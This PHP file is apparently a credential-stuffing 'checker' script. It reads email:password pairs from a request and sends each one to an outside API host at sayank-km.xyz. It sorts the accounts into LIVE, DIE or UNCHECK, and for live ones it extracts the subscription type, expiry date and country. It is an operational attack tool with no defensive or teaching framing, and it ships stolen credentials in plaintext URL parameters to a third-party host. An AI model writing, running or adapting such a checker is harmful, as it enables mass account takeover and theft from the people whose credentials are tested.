<?php
/*
    1: NOTICE
    -1: UNCHECK
    2: DIE
    3: BAD/SOCKS DIE
    0: LIVE
*/
date_default_timezone_set("Asia/Jakarta");
// function
require_once 'includes/class_curl.php';

// info data
$empass = $_REQUEST['mailpass'];
$delim = $_REQUEST['delim'];
list($email,$pwd) = explode($delim, $empass);
$result = array();

// info curl
$cookie = "cookies/".md5($email.'|'.$pwd)."_cookie.txt";
/* $curl = new curl();
$curl->cookies($cookie);
if ($sock) $curl->socks($sock);
$curl->ssl(0,2); */

$page = curl("http://sayank-km.xyz/api/?email={$email}&pass={$pwd}","",$cookie);
if (in_string($page,"fail")) {
  $result["error"] = 2;
  $result["msg"] = '<b style="color:red">DIE</b> | '.$email.' | '.$pwd;
} else if (in_string($page,"success")) {
  // Get Info
  $tai = curl("http://sayank-km.xyz/api/?email={$email}&pass={$pwd}",$cookie);
  $info["subscription"] = fetch_value($tai,'"subscription":"','"');
  $info["Berlaku"] = fetch_value($tai,'"Berlaku":["','"]');
  $info["Negara"] = fetch_value($tai,'"Negara":["','"]');
  $result["error"] = 0;
  $live = '<b style="color:green">LIVE</b> | '.$email.' | '.$pwd.' | <b><font color=red>'.$info["subscription"].'</font></b> | <b><font color=blue>Expired: '.$info["Berlaku"].'</font></b> | <b><font color=red>Negara: '.$info["Negara"].'</font></b> #nblh_tools ';
  $result["msg"] = $live;
} else {
  $result["error"] = -1;
  $result["msg"] = '<b style="color:red">UNCHECK</b> | '.$email.' | '.$pwd;
}

echo json_encode($result);
@unlink($cookie);

//$curl->close(); // tutup curl
?>